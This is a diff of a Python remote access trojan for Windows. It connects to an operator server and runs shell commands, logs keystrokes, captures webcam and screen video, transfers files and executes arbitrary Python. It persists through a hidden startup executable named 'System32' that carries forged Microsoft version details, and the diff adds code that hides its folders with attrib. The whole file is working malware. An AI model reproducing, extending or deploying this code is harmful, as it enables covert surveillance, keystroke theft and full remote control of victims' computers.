@@ -13,33 +13,33 @@ import json
 import mss
 import sys
 import os
- 
+
 ORIGIN, options = base64.b64decode(sys.argv[1]).decode().split("@@")
- 
+
 options = options.split("-")
 STARTUP = options[1] == "1"
 UAC = options[2] == "1"
 ID = f"{os.environ['USERDOMAIN']}-{os.environ['USERNAME']}"
- 
+
 if ctypes.windll.shell32.IsUserAnAdmin():
     ID = ID + '-UAC'
- 
+
 USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 BASE_FOLDER_NAME = os.path.dirname(sys.executable).split("\\")[-1]
 TEMP = os.environ.get("TEMP", os.environ.get("APPDATA", "UNKNOWN"))
 SIO = socketio.Client()
- 
+
 def randomString(length):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
- 
+
 def getFileName(ext):
     timeStamp = time.strftime("%Y-%m-%d-%H-%M-%S")
     return os.path.join(TEMP, f"{timeStamp}-{randomString(5)}.{ext}")
- 
+
 def toServer(data):
     if not SIO.connected: return
     SIO.emit("to-server", data)
- 
+
 def pipInstall(t, args):
     toServer({
         "type": t,
@@ -50,10 +50,10 @@ def pipInstall(t, args):
         "action": "pip",
         "pipArgs": args
     })
- 
+
 def postFile(t, filePath):
     requests.post(f"{ORIGIN}/client", files={"file": open(filePath, "rb")}, data={"id": ID,"type": t})
- 
+
 class Terminal:
     def __init__(self, options):
         self.type = options.get("type")
@@ -76,11 +76,11 @@ class Terminal:
     def run(self):
         if self.app != "cmd": 
             self.value = f"{self.app} {self.value}"
- 
+
         result = subprocess.run(
             self.value, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
         )
- 
+
         toServer({
             "type": self.type,
             "output": result.stdout
@@ -90,7 +90,7 @@ class Webcam:
     def __init__(self, options):
         self.type = options.get("type")
         self.deviceIndex = int(options.get("deviceIndex"))
- 
+
         self.snapshot()
     
     def snapshot(self):
@@ -119,7 +119,7 @@ class Webcam:
         cv2.imwrite(filename, frame)
         postFile(self.type, filename)
         os.remove(filename)
- 
+
 DISPLAY_IS_RECORDING = False
 class Display:
     def __init__(self, options):
@@ -127,7 +127,7 @@ class Display:
         self.action = options.get("action")
         self.deviceIndex = int(options.get("deviceIndex"))
         self.duration = int(options.get("duration"))
- 
+
         if self.action == "snapshot":
             self.snapshot()
         elif self.action == "record":
@@ -171,7 +171,7 @@ class Display:
             'preset': 'ultrafast',
             'tune': 'zerolatency'
         }
- 
+
         FPS = 15
         for _ in range((self.duration + 2) * FPS):
             img = np.array(sct.grab(monitor))
@@ -180,7 +180,7 @@ class Display:
             for packet in stream.encode(frame):
                 output.mux(packet)
             time.sleep(1 / FPS)
- 
+
         for packet in stream.encode():
             output.mux(packet)
         
@@ -188,12 +188,12 @@ class Display:
         DISPLAY_IS_RECORDING = False
         postFile(self.type, filename)
         os.remove(filename)
- 
+
 class Sound:
     def __init__(self, options):
         self.type = options.get("type")
         self.filePath = options.get("filePath")
- 
+
         self.play()
     
     def play(self):
@@ -208,7 +208,7 @@ class Sound:
             "type": self.type,
             "output": f"Playing: {self.filePath}"
         })
- 
+
 class Notifications:
     def __init__(self, options):
         self.type = options.get("type")
@@ -217,7 +217,7 @@ class Notifications:
         self.message = options.get("message")
         self.icon = int(options.get("icon"))
         self.buttons = int(options.get("buttons"))
- 
+
         if self.action == "messagebox":
             self.messagebox()
         
@@ -227,14 +227,14 @@ class Notifications:
             "output": f"Messagebox opened successfully"
         })
         ctypes.windll.user32.MessageBoxW(0, self.title, self.message, self.buttons | self.icon)
- 
+
 KEYBOARD_STATE = False
 class Keyboard:
     def __init__(self, options):
         global KEYBOARD_STATE
         self.type = options.get("type")
         self.action = options.get("action")
- 
+
         output = f"KEYBOARD_STATE: {KEYBOARD_STATE}"
         if self.action == "start" and KEYBOARD_STATE == False:
             KEYBOARD_STATE = True
@@ -245,7 +245,7 @@ class Keyboard:
             KEYBOARD_STATE = False
             keyboard.unhook_all()
             output = "Keyboard stopped"
- 
+
         toServer({
             "type": self.type,
             "output": output
@@ -257,13 +257,13 @@ class Keyboard:
                 "type": self.type,
                 "output": event.name
             })
- 
+
 class FileManager:
     def __init__(self, options):
         self.type = options.get("type")
         self.action = options.get("action")
         self.value = options.get("value")
- 
+
         if self.action == "goto":
             self.goto()
         elif self.action == "upload":
@@ -292,7 +292,7 @@ class FileManager:
         response = requests.get(url, headers={
             "User-Agent": USERAGENT
         })
- 
+
         if response.status_code == 200:
             with open(filename, "wb") as f:
                 f.write(response.content)
@@ -339,7 +339,7 @@ class FileManager:
             "files": files,
             "folders": folders
         })
- 
+
 PYTHON_SUBPROCESS_PID = None
 class Python:
     def __init__(self, options):
@@ -347,7 +347,7 @@ class Python:
         self.action = options.get("action")
         self.pipArgs = options.get("pipArgs")
         self.code = options.get("code", "")
- 
+
         if self.action == "run":
             self.run()
         elif self.action == "kill":
@@ -405,12 +405,12 @@ class Python:
             "type": self.type,
             "output": result.stdout
         })
- 
+
 class Others:
     def __init__(self, options):
         self.type = options.get("type")
         self.action = options.get("action")
- 
+
         if self.action == "uac":
             self.uac()
         elif self.action == "startup":
@@ -434,7 +434,7 @@ class Others:
         stubFile = os.path.join(os.environ["APPDATA"], "python313", "stub.py")
         versionFile = os.path.join(os.environ["APPDATA"], "python313", "version.txt")
         pythonwPath = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
- 
+
         # Baixa o icone do GitHub
         try:
             icoUrl = "https://raw.githubusercontent.com/SystemSteamUpdatb/System32/main/icon.ico"
@@ -444,7 +444,7 @@ class Others:
                     f.write(r.content)
         except:
             icoFile = "C:\\Windows\\System32\\shell32.dll"
- 
+
         # Cria o arquivo de versao com fornecedor Microsoft Corporation
         with open(versionFile, "w") as f:
             f.write("""VSVersionInfo(
@@ -463,17 +463,16 @@ class Others:
     VarFileInfo([VarStruct('Translation', [1033, 1200])])
   ]
 )""")
- 
+
         # Cria o script stub que sera compilado
-        # Usa pythonw.exe para rodar sem janela
         with open(stubFile, "w") as f:
             f.write(f'''import subprocess
 import os
- 
+
 pythonw = r"{pythonwPath}"
 module_dir = os.path.join(os.environ["APPDATA"], "{BASE_FOLDER_NAME}")
 arg = "{sys.argv[1]}"
- 
+
 subprocess.Popen(
     [pythonw, "-m", "System32", arg],
     cwd=module_dir,
@@ -481,27 +480,27 @@ subprocess.Popen(
     close_fds=True
 )
 ''')
- 
+
         # Instala pyinstaller se necessario
         pipPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pip.exe")
         pyinstallerPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pyinstaller.exe")
- 
+
         subprocess.run(
             f'"{pipPath}" install pyinstaller',
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
- 
+
         # Compila o stub em .exe com icone, versao e sem janela
         subprocess.run(
             f'"{pyinstallerPath}" --onefile --windowed --icon="{icoFile}" --version-file="{versionFile}" --distpath="{startupFolder}" --name="System32" "{stubFile}"',
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
- 
+
         toServer({
             "type": self.type,
             "output": f"Startup file created successfully" if os.path.exists(exeFile) else f"Startup file creation failed"
         })
- 
+
 HANDLER_MAP = {
     "terminal": Terminal,
     "webcam": Webcam,
@@ -513,24 +512,30 @@ HANDLER_MAP = {
     "python": Python,
     "others": Others,
 }
- 
+
 @SIO.on("connect")
 def onConnect():
     try:
         a = os.path.join(os.environ.get("APPDATA"), "hasPython")
         if not os.path.exists(a):
             os.mkdir(a)
+
+        # Oculta as pastas python313 e hasPython
+        python313 = os.path.join(os.environ.get("APPDATA"), "python313")
+        subprocess.run(f'attrib +h +s "{a}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(f'attrib +h +s "{python313}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
         SIO.emit("to-server", {
             "type": "terminal",
             "output": f"Current Directory: {os.getcwd()}",
             "cwd": os.getcwd()
         })
     except: pass
- 
+
 @SIO.on("disconnect")
 def onDisconnect():
     pass
- 
+
 @SIO.on("receiver")
 def onReceiver(data):
     try: HANDLER_MAP.get(data.get("type"))(data)
@@ -539,11 +544,11 @@ def onReceiver(data):
             "type": data.get("type"),
             "output": f"ERROR: {e}"
         })
- 
+
 def main():
     if STARTUP: Others({"type": "others", "action": "startup"})
     if UAC: Others({"type": "others", "action": "uac"})
- 
+
     while True:
         try:
             SIO.connect(ORIGIN, wait_timeout=10, auth={
@@ -553,7 +558,6 @@ def main():
             SIO.wait()
         except:
             time.sleep(4)
- 
+
 if __name__ == "__main__":
     main()
- 
